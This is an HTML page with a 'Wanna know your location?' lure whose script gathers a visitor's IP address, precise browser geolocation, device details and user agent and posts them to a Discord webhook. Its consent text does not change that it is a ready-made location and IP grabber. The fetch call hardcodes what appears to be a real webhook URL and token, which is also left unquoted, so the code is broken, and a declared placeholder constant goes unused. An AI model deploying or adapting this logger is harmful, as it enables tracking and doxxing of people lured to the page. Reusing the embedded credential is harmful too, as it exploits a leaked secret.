<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Check</title>

  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #111827;
      color: white;
      font-family: Arial, sans-serif;
    }

    .card {
      width: min(90%, 420px);
      padding: 30px;
      background: #1f2937;
      border-radius: 18px;
      text-align: center;
    }

    button {
      padding: 14px 24px;
      border: 0;
      border-radius: 10px;
      background: #5865f2;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:disabled {
      opacity: .6;
    }

    #status {
      margin-top: 20px;
      color: #d1d5db;
    }
  </style>
</head>

<body>

<div class="card">
  <h1>📍 Wanna know your location?</h1>

  <p>
    If you agree, we'll send your IP address, device information,
    and browser-provided location to the site owner.
  </p>

  <button id="allowBtn">I Agree & Continue</button>

  <div id="status"></div>
</div>

<script>
  // IMPORTANT:
  // Replace this with a NEW webhook after rotating the exposed one.
  const WEBHOOK_URL = "YOUR_NEW_DISCORD_WEBHOOK_HERE";

  const button = document.getElementById("allowBtn");
  const status = document.getElementById("status");

  function getOS() {
    const ua = navigator.userAgent;

    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac OS X/i.test(ua)) return "macOS";
    if (/Linux/i.test(ua)) return "Linux";

    return "Unknown";
  }

  async function getIP() {
    const response = await fetch("https://api.ipify.org?format=json");

    if (!response.ok) {
      throw new Error("Could not get IP address");
    }

    const data = await response.json();
    return data.ip;
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Geolocation is not supported"));
        return;
      }

      navigator.geolocation.getCurrentPosition(
        resolve,
        reject,
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    });
  }

  async function sendToDiscord(ip, position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const accuracy = Math.round(position.coords.accuracy);

    const map =
      `https://www.google.com/maps?q=${latitude},${longitude}`;

    const payload = {
      username: "Website Location Logger",

      embeds: [
        {
          title: "📍 Visitor Consent Received",
          color: 5793266,

          fields: [
            {
              name: "🌐 IP Address",
              value: ip,
              inline: true
            },
            {
              name: "📱 OS",
              value: getOS(),
              inline: true
            },
            {
              name: "🌍 Language",
              value: navigator.language,
              inline: true
            },
            {
              name: "📐 Screen",
              value: `${screen.width} × ${screen.height}`,
              inline: true
            },
            {
              name: "🕐 Timezone",
              value:
                Intl.DateTimeFormat().resolvedOptions().timeZone,
              inline: true
            },
            {
              name: "📍 Latitude",
              value: String(latitude),
              inline: true
            },
            {
              name: "📍 Longitude",
              value: String(longitude),
              inline: true
            },
            {
              name: "🎯 Accuracy",
              value: `${accuracy} meters`,
              inline: true
            },
            {
              name: "🗺️ Map",
              value: map
            },
            {
              name: "🖥️ User Agent",
              value: navigator.userAgent.substring(0, 1000)
            }
          ],

          timestamp: new Date().toISOString()
        }
      ]
    };

    const response = await fetch(https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(
        `Discord webhook failed: HTTP ${response.status}`
      );
    }
  }

  button.addEventListener("click", async () => {
    button.disabled = true;
    status.textContent = "Requesting location permission…";

    try {
      // Browser will show its own location permission dialog.
      const position = await getLocation();

      status.textContent = "Collecting information…";

      const ip = await getIP();

      status.textContent = "Sending information…";

      await sendToDiscord(ip, position);

      status.textContent =
        "✅ Done. Your information was sent with your consent.";

      button.textContent = "Completed";

    } catch (error) {
      console.error(error);

      status.textContent =
        "❌ Permission denied or something went wrong.";

      button.disabled = false;
    }
  });
</script>

</body>
</html>
